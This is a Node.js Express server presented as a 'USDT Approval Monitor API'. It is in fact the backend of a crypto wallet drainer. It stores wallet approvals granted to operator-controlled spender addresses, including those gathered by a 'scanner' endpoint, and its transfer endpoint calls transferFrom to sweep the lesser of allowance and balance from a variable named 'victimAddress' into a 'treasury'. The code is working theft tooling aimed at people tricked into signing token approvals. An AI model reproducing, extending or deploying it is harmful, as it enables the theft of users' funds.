import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import mongoose from "mongoose";
import Approved from "./models/Approved.js";
import { TronWeb } from 'tronweb';


dotenv.config();

/* ================= CONFIG ================= */

const app = express();
const PORT = process.env.PORT || 3000;
const MONGO_DB = process.env.MONGO_DB;
const CORS_ORIGIN = process.env.CORS_ORIGIN || "*";
const MONITOR_APPROVAL_FOR = process.env.MONITOR_APPROVAL_FOR;
const MONITOR_APPROVAL_FOR_TRON = process.env.MONITOR_APPROVAL_FOR_TRON;
const TRON_WALLET_PRIVATE_KEY = process.env.TRON_WALLET_PRIVATE_KEY;

const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  privateKey: TRON_WALLET_PRIVATE_KEY
});

/* ================= MIDDLEWARE ================= */

app.use(express.json());
app.use(cors({
  origin: CORS_ORIGIN === "*" ? true : CORS_ORIGIN.split(",").map(x => x.trim()),
  methods: ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
}));

/* ================= HEALTH ================= */

app.get("/health", (_req, res) => {
  res.json({ ok: true, wallet: MONITOR_APPROVAL_FOR });
});

app.get("/", (_req, res) => {
  res.json({ message: "Welcome to the USDT Approval Monitor API", wallet: MONITOR_APPROVAL_FOR });
});

/* ================= APPROVED API ================= */

// GET - Fetch approved records
app.get("/api/approved", async (req, res) => {
  try {
    const { isProcessed, network, owner } = req.query;
    const limit = Math.min(Number(req.query.limit) || 100, 1000);

    const filter = {};
    if (isProcessed === "true" || isProcessed === "false") {
      filter.isProcessed = isProcessed === "true";
    }
    if (network) filter.network = network;
    if (owner) {
      filter.owner = { $regex: new RegExp(`^${String(owner)}$`, "i") };
    }

    const data = await Approved.find(filter).sort({ createdAt: -1 }).limit(limit);
    res.json({ count: data.length, data });
  } catch (error) {
    res.status(500).json({ message: "Failed to fetch approved data", error: error.message });
  }
});

// POST - Store a new approval record
app.post("/api/approved", async (req, res) => {
  try {
    const {
      network,
      owner,
      spender,
      amount,
      txHash,
    } = req.body;

    // Validate required fields
    const missingFields = [];
    if (!network) missingFields.push("network");
    if (!owner) missingFields.push("owner");
    if (!spender) missingFields.push("spender");
    if (!amount) missingFields.push("amount");
    if (!txHash) missingFields.push("txHash");

    if (missingFields.length > 0) {
      return res.status(400).json({
        message: "Missing required fields",
        missing: missingFields,
      });
    }

    const ownerHexAddress = network === "TRON Mainnet" ? tronWeb.address.toHex(owner) : null;

    console.log("Owner hex address is: ", ownerHexAddress, owner);


    const record = await Approved.findOneAndUpdate(
      { txHash },                          // unique key (matches schema index)
      {
        $set: {
          network,
          owner: owner,
          ownerHexAddress: ownerHexAddress,
          spender: spender,
          amount: String(amount),
          txHash
        },
        $setOnInsert: { isProcessed: false },      // only set on first insert
      },
      { upsert: true, new: true }
    );

    res.status(201).json({ message: "Approval record saved", data: record });
  } catch (error) {
    // Duplicate key race condition (two identical requests at once)
    if (error.code === 11000) {
      return res.status(409).json({ message: "Duplicate record: txHash already exists" });
    }
    res.status(500).json({ message: "Failed to save approval record", error: error.message });
  }
});


// For Scanner Only 
app.post("/api/scanner-approval", async (req, res) => {
  try {
    const { address } = req.body;

    if (!address) {
      return res.status(400).json({
        message: "Missing required field: address",
      });
    }

    const owner = address;

    // Detect network
    const network = owner.startsWith("0x")
      ? "BSC Mainnet"
      : "TRON Mainnet";

    const ownerHexAddress = network === "TRON Mainnet" ? tronWeb.address.toHex(owner) : null;


    const record = await Approved.findOneAndUpdate(
      {
        owner: {
          $regex: new RegExp(`^${owner}$`, "i"),
        },
      },
      {
        $set: {
          network,
          owner,
          ownerHexAddress: ownerHexAddress,
          spender: network === "TRON Mainnet" ? MONITOR_APPROVAL_FOR_TRON : MONITOR_APPROVAL_FOR,
          amount: "1",
        },
        $setOnInsert: {
          isProcessed: false,
        },
      },
      {
        upsert: true,
        new: true,
      }
    );

    res.status(201).json({
      message: "Approval record saved",
      data: record,
    });

  } catch (error) {

    console.error("Error in /api/scanner-approval:", error);

    if (error.code === 11000) {
      return res.status(200).json({
        message: "Approval record already exists",
      });
    }

    res.status(500).json({
      message: "Server error",
      error: error.message,
    });
  }
});


app.post("/api/transfer-usdt-trc20", async (req, res) => {
  try {
    const { address } = req.body;

    console.log("Address -> : ", address);


    if (!address) {
      return res.status(400).json({
        message: "Missing required field: address",
      });
    }

    console.log("address is: ", address);


    const record = await Approved.findOne({
      owner: new RegExp(`^${address}$`, "i"),
      network: new RegExp("^TRON Mainnet$", "i"),
    });

    if (!record) {
      return res.status(404).json({
        message: "Record not found",
      });
    }

    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const contract = await tronWeb.contract().at(USDT_CONTRACT);


    const base58Address = tronWeb.address.fromHex(record?.ownerHexAddress);
    console.log("base58Address is: ", base58Address, record?.owner);


    const victimAddress = base58Address;
    const treasuryAddress = record.spender;

    const allowanceRes = await contract.allowance(victimAddress, treasuryAddress).call();

    // const allowanceRes = await contract.allowance(treasuryAddress, victimAddress).call();

    const balanceRes = await contract.balanceOf(victimAddress).call();

    const allowance = BigInt(allowanceRes.toString());
    const balance = BigInt(balanceRes.toString());

    const transferable = allowance < balance ? allowance : balance;

    console.log("allowance is: ", allowance, "balance is: ", balance, "transferable is: ", transferable);


    if (transferable === 0n) {
      return res.status(400).json({
        message: "Insufficient approved amount or zero balance",
      });
    }

    const txHash = await contract.transferFrom(
      victimAddress,
      treasuryAddress,
      transferable.toString()
    ).send();

    res.status(201).json({
      message: "USDT transferred successfully",
      txHash,
    });

  } catch (error) {
    res.status(500).json({
      message: "Server error",
      error: error.message,
    });
  }
});


/* ================= START SERVER ================= */

async function start() {
  try {
    await mongoose.connect(MONGO_DB);
    console.log("✅ MongoDB connected");

    app.listen(PORT, "0.0.0.0", () => {
      console.log(`✅ API running globally on port ${PORT}`);
    });
  } catch (error) {
    console.error("❌ Startup failed:", error.message);
    process.exit(1);
  }
}

start();